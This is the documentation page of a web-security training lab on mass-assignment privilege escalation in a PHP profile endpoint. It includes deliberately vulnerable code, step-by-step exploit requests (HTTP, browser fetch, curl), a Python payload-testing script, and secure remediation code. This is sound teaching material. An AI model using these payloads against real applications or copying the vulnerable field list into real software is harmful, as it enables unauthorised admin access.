# Lab 4: User Role Can Be Modified in User Profile

## Overview

This lab demonstrates a **privilege escalation vulnerability** through mass assignment (also known as parameter tampering) in user profile updates. The vulnerability allows users to modify their own role ID by including it in the JSON payload when updating their profile.

## Vulnerability Type

- **Category:** Broken Access Control / Mass Assignment
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **OWASP:** A01:2021 - Broken Access Control
- **Severity:** Critical

## Lab Environment

### Application Structure

```
lab4/
├── index.php           # Main landing page
├── login.php           # User authentication
├── profile.php         # Vulnerable profile update (EXPLOIT HERE)
├── admin.php           # Admin panel (requires roleid=2)
├── logout.php          # Session logout
├── success.php         # Lab completion page
├── config.php          # Database configuration
└── docs.php            # This documentation
```

### User Roles

| Role ID | Role Name     | Access Level                      |
|---------|---------------|-----------------------------------|
| 1       | Regular User  | Can access profile only           |
| 2       | Administrator | Can access admin panel, delete users |

### Default Accounts

| Username       | Password    | Role ID | Purpose           |
|----------------|-------------|---------|-------------------|
| administrator  | admin123    | 2       | System admin      |
| carlos         | carlos123   | 1       | Target to delete  |
| wiener         | peter       | 1       | Attacker account  |
| alice          | alice123    | 1       | Regular user      |
| bob            | bob123      | 1       | Regular user      |

## The Vulnerability

### Vulnerable Code

The vulnerability exists in `profile.php`. When processing a profile update request, the server accepts **all fields** from the JSON input without proper validation:

```php
// VULNERABLE CODE
$allowedFields = ['email', 'full_name', 'department', 'phone', 'address', 'notes', 'roleid'];

foreach ($allowedFields as $field) {
    if (isset($data[$field])) {
        $updateFields[] = "$field = ?";
        $params[] = $data[$field];
    }
}
```

**The Problem:** The `roleid` field is included in the allowed fields array, allowing users to escalate their privileges.

### Information Disclosure

The response from a profile update includes the user's role ID, which provides valuable information to an attacker:

```json
{
    "success": true,
    "message": "Profile updated successfully",
    "user": {
        "username": "wiener",
        "email": "wiener@example.com",
        "roleid": 1,    // <-- This reveals the role field exists
        ...
    }
}
```

## Exploitation Guide

### Step 1: Login

Login with the provided credentials:
- Username: `wiener`
- Password: `peter`

### Step 2: Observe Normal Request

1. Go to **My Profile**
2. Update your email address
3. Open Browser Developer Tools (F12) → Network tab
4. Observe the JSON request being sent:

```http
POST /lab4/profile.php HTTP/1.1
Content-Type: application/json

{
    "email": "newemail@example.com",
    "department": "Development"
}
```

### Step 3: Analyze Response

The response reveals the `roleid` field:

```json
{
    "success": true,
    "user": {
        "username": "wiener",
        "email": "newemail@example.com",
        "roleid": 1,
        ...
    }
}
```

### Step 4: Exploit - Add roleid

Modify your request to include `roleid: 2`:

```http
POST /lab4/profile.php HTTP/1.1
Content-Type: application/json

{
    "email": "newemail@example.com",
    "roleid": 2
}
```

**Using Browser Console:**

```javascript
fetch('profile.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        email: 'attacker@evil.com',
        roleid: 2
    })
})
.then(r => r.json())
.then(console.log);
```

**Using cURL:**

```bash
curl -X POST http://localhost/lab4/profile.php \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=your_session_id" \
  -d '{"email":"test@test.com","roleid":2}'
```

### Step 5: Access Admin Panel

1. Navigate to `/admin.php`
2. You now have administrator access!
3. Delete user `carlos` to complete the lab

## Remediation

### Secure Implementation

Never include sensitive fields in the allowed update list:

```php
// SECURE CODE
$allowedFields = ['email', 'full_name', 'department', 'phone', 'address', 'notes'];
// Note: 'roleid' is NOT included

// Additional: Explicitly block sensitive fields
$sensitiveFields = ['roleid', 'id', 'username', 'password', 'api_key'];
foreach ($sensitiveFields as $field) {
    unset($data[$field]);
}
```

### Best Practices

1. **Whitelist Only Safe Fields**
   - Never include role, permissions, or ID fields in update endpoints

2. **Separate Admin Functions**
   - Role changes should require separate admin-only endpoints

3. **Server-Side Validation**
   - Always validate and sanitize input on the server

4. **Principle of Least Privilege**
   - Only expose necessary fields in API responses

5. **Input Filtering**
   - Strip unexpected fields from requests before processing

### Secure Code Example

```php
// Define ONLY fields users can modify themselves
$userEditableFields = ['email', 'phone', 'address'];

// Filter input to only allowed fields
$safeData = array_intersect_key($data, array_flip($userEditableFields));

// Use prepared statements with only safe data
foreach ($safeData as $field => $value) {
    $updateFields[] = "$field = ?";
    $params[] = $value;
}
```

## Testing Methodology

### Manual Testing

1. Capture a legitimate profile update request
2. Identify all fields in the response
3. Add each response field to the request
4. Check if sensitive fields (role, permissions) can be modified

### Automated Testing

```python
import requests

session = requests.Session()
# Login first...

# Test mass assignment
test_payloads = [
    {"email": "test@test.com", "roleid": 2},
    {"email": "test@test.com", "role": "admin"},
    {"email": "test@test.com", "isAdmin": True},
    {"email": "test@test.com", "permissions": ["admin"]},
]

for payload in test_payloads:
    response = session.post(
        "http://target/profile.php",
        json=payload
    )
    print(f"Payload: {payload}")
    print(f"Response: {response.json()}")
```

## Related Vulnerabilities

- **CWE-915:** Mass Assignment
- **CWE-639:** Authorization Bypass Through User-Controlled Key
- **CWE-284:** Improper Access Control
- **CWE-269:** Improper Privilege Management

## References

- [OWASP Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_HTTP_Incoming_Requests)
- [PortSwigger - Access Control](https://portswigger.net/web-security/access-control)
- [CWE-915 Details](https://cwe.mitre.org/data/definitions/915.html)
